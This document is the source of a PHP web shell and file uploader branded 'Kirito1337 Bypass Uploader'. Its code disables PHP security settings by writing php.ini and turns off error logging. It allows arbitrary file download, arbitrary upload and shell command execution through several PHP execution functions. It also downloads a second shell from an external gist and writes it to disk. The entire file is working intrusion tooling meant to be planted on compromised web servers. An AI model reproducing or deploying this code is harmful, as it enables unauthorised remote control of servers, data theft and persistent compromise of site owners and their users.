<link rel="icon" href="https://i.hizliresim.com/g9ANVb.png" type="image/x-icon"/>
<link rel="shortcut icon" href="https://i.hizliresim.com/g9ANVb.png" type="image/x-icon"/>
<center>
<?php
session_start();
error_reporting(0);
set_time_limit(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
$phi = fopen("php.ini","w+");
fwrite($phi,"safe_mode = Off
disable_functions = NONE
safe_mode_gid = OFF
open_basedir = OFF ");
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>
<html>
<title>Kirito1337#Uploader</title>
<center>
	<h1>Kirito1337 Bypass Uploader [PRiV8]</h1>
</center>
<center><a href="https://www.youtube.com/channel/UCzP6CCqlHa5jT4wwb6k34gw"><img src="https://i.hizliresim.com/7ybOpN.png" alt="Kirito1337"></a></center>
<center>
<?php
echo '<b><br><br>'.php_uname().'<br></b>';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Uploaded Successfully :p</b><br><br>'; }
	else { echo '<b>Upload Failed! >:( </b><br><br>'; }
}
?></p>
</body>
</center>
<h2>OR(GET):</h2>
<center>
<?php
echo '<form action="" method="get" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Uploaded Successfully :p</b><br><br>'; }
	else { echo '<b>Upload Failed! >:( </b><br><br>'; }
}
?></p>
</body>
</center>
<center><h4>Code By: Kirito1337 / SpyHackerZ.Com # ImHatimi.Org</h4></center>
</html>
<header>
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Ubuntu);
html {
    background: #000000;
    color: #ffffff;
    font-family: 'Ubuntu';
	font-size: 13px;
	width: 100%;
}
li {
	display: inline;
	margin: 5px;
	padding: 5px;
}
table, th, td {
	border-collapse:collapse;
	font-family: Tahoma, Geneva, sans-serif;
	background: transparent;
	font-family: 'Ubuntu';
	font-size: 13px;
}
.table_home, .th_home, .td_home {
	border: 1px solid #ffffff;
}
th {
	padding: 10px;
}
a {
	color: #ffffff;
	text-decoration: none;
}
a:hover {
	color: gold;
	text-decoration: underline;
}
b {
	color: gold;
}
input[type=text], input[type=password],input[type=submit] {
	background: transparent; 
	color: #ffffff; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Ubuntu';
	font-size: 13px;
}
textarea {
	border: 1px solid #ffffff;
	width: 100%;
	height: 400px;
	padding-left: 5px;
	margin: 10px auto;
	resize: none;
	background: transparent;
	color: #ffffff;
	font-family: 'Ubuntu';
	font-size: 13px;
}
select {
	width: 152px;
	background: #000000; 
	color: lime; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Ubuntu';
	font-size: 13px;
}
option:hover {
	background: lime;
	color: #000000;
}
</style>
</head>
</header>
<?php
function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function r($dir,$perm) {
	if(!is_readable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function exe($cmd){
	$xazx = "";
	$cmd = $cmd." 2>&1";

	if(is_callable('system')) {
		ob_start();
		@system($cmd);
		$xazx = ob_get_contents();
		ob_end_clean();
		if(!empty($xazx)) return $xazx;
	}
	if(is_callable('shell_exec')){
		$xazx = @shell_exec($cmd);
		if(!empty($xazx)) return $xazx;
	}
	if(is_callable('exec')) {
		@exec($cmd,$azxr);
		if(!empty($azxr)) foreach($azxr as $azxs) $xazx .= $azxs;
		if(!empty($xazx)) return $xazx;
	}
	if(is_callable('passthru')) {
		ob_start();
		@passthru($cmd);
		$xazx = ob_get_contents();
		ob_end_clean();
		if(!empty($xazx)) return $xazx;
	}
	if(is_callable('proc_open')) {
		$azxdescriptorspec = array(
		0 => array("pipe", "r"),
		1 => array("pipe", "w"),
		2 => array("pipe", "w")
		);
		$azxproc = @proc_open($cmd, $azxdescriptorspec, $azxpipes, getcwd(), array());
		if (is_resource($azxproc)) {
			while ($azxsi = fgets($azxpipes[1])) {
				if(!empty($azxsi)) $xazx .= $azxsi;
			}
			while ($azxse = fgets($azxpipes[2])) {
				if(!empty($azxse)) $xazx .= $azxse;
			}
		}
		@proc_close($azxproc);
		if(!empty($xazx)) return $xazx;
	}
	if(is_callable('popen')){
		$azxf = @popen($cmd, 'r');
		if($azxf){
			while(!feof($azxf)){
				$xazx .= fread($azxf, 2096);
			}
			pclose($azxf);
		}
		if(!empty($xazx)) return $xazx;
	}
	return "";
}

function perms($file){
	$perms = fileperms($file);
	if (($perms & 0xC000) == 0xC000) {
	// Socket
	$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
	// Symbolic Link
	$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
	// Regular
	$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
	// Block special
	$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
	// Directory
	$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
	// Character special
	$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
	// FIFO pipe
	$info = 'p';
	} else {
	// Unknown
	$info = 'u';
	}
		// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}
function hdd($s) {
	if($s >= 1073741824)
	return sprintf('%1.2f',$s / 1073741824 ).' GB';
	elseif($s >= 1048576)
	return sprintf('%1.2f',$s / 1048576 ) .' MB';
	elseif($s >= 1024)
	return sprintf('%1.2f',$s / 1024 ) .' KB';
	else
	return $s .' B';
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
function getsource($url) {
    $curl = curl_init($url);
    		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    		curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    $content = curl_exec($curl);
    		curl_close($curl);
    return $content;
}

if(get_magic_quotes_gpc()) {
	function azzatssinsx($array) {
		return is_array($array) ? array_map('azzatssinsx', $array) : stripslashes($array);
	}
	$_POST = azzatssinsx($_POST);
	$_COOKIE = azzatssinsx($_COOKIE);
}

if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$ds = @ini_get("disable_functions");
$mysql = (function_exists('mysql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
?>
</center>
<center><h3>GH0ST SHELL DiR: SiTE.COM/up.php(UP.PHP DiR)/shell/GH0ST</h3></center>
<?php 	mkdir("shell"); 	?>
<?php if($_GET['mix-file'] == 'GH0ST') { 		 mkdir('shell/GH0ST/', 0755); 	 $file_portx1 = "shell/GH0ST/index1.php";   $htportx1 = fopen("shell/GH0ST/index.php", "w"); 	 $portx1_script = file_get_contents("https://gist.githubusercontent.com/AndrHacK/3e0630f56e06ccd85e2476a12106796a/raw/68e9420f88732ae041383faf314bd281e3ed5e9f/gistfile1.txt"); 	 $portx1 = fopen($file_portx1, "w"); 	 fwrite($portx1, $portx1_script); 	 fwrite($htportx1, $isi_htportx1); 	 chmod($file_portx1, 0755);	} 		?> 
